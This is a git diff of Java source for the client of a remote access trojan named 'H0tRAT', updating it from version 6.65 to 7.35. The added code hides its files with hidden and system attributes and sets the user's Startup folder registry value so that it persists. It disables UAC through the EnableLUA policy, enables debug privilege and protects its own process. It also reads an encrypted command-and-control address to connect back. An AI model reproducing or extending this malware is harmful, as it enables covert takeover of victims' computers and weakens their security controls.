@@ -1,5 +1,7 @@
 package me.client;
 
+import com.sun.jna.Memory;
+import com.sun.jna.Pointer;
 import com.sun.jna.WString;
 import com.sun.jna.platform.win32.*;
 import me.client.send.*;
@@ -14,7 +16,7 @@ import static com.sun.jna.platform.win32.WinBase.MUTEX_ALL_ACCESS;
 
 public class Client {
     public static final String HEAD = "H0tRAT";
-    public static final String VERSION = "6.65";
+    public static final String VERSION = "7.35";
     public static boolean isturn = false;
     public static Socket socket;
     public static InetSocketAddress inetSocketAddress;
@@ -35,7 +37,10 @@ public class Client {
 
     public static void register() throws IOException {
         Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup",getPath());
-        LoadDLL.instance.HideFile1(new WString(getPath()));
+        WinDef.DWORD dword = new WinDef.DWORD(WinNT.FILE_ATTRIBUTE_HIDDEN | WinNT.FILE_ATTRIBUTE_SYSTEM | 0x00000001);
+        Kernel32.INSTANCE.SetFileAttributes(getPath(),dword);
+        Kernel32.INSTANCE.SetFileAttributes(getPath1(),dword);
+        Advapi32Util.registrySetIntValue(WinReg.HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0x00000000);//关闭UAC提示
     }
 
     public static String GetIP() {
@@ -49,6 +54,7 @@ public class Client {
             while ((len = fileInputStream.read(bytes))!=-1) {
                 temp += new String(bytes,0,len);
             }
+            fileInputStream.close();
             temp1 = new String(AESUtils.decrypt(temp));
             IP = temp1.substring(temp1.indexOf("IP:") + 3,temp1.indexOf("|"));
         }catch (Exception e) {
@@ -69,6 +75,7 @@ public class Client {
             while ((len = fileInputStream.read(bytes))!=-1) {
                 temp += new String(bytes,0,len);
             }
+            fileInputStream.close();
             temp1 = new String(AESUtils.decrypt(temp));
             Port = temp1.substring(temp1.indexOf("Port:") + 5);
             port = Integer.parseInt(Port);
@@ -78,16 +85,27 @@ public class Client {
     }
     public static void relieve() throws IOException {
         //解除主机
+        LoadDLL.instance.RemoveProtect();
         Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup","wowWTF");
-        File file = new File(getPath() + "\\javaw.jar");
-        file.deleteOnExit();
+        Advapi32Util.registrySetIntValue(WinReg.HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0x00000001);
+        File file = new File(getPath1() + "\\360Security.ini");
+        file.delete();
         System.exit(0);
+    }
+    public static void lock() {
+        if(Kernel32.INSTANCE.OpenMutex(MUTEX_ALL_ACCESS,false,"HotRat") == null) {
+            Kernel32.INSTANCE.CreateMutex(null,false,"HotRat");
+        }else {
+            Kernel32.INSTANCE.ExitProcess(0);
+        }
     }
     public static void main(String[] args) throws Exception {
         UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
-        LoadDLL.instance.Lock();
+        lock();
         register();
-        new AutoCheckFile().start();
+        LoadDLL.instance.EnableDebugPriv();
+        LoadDLL.instance.ProtectProcess();
+        new Thread(new ShutdownChecker()).start();
         inetSocketAddress = new InetSocketAddress(GetIP(),GetPort());
         try {
             while (!isturn) {
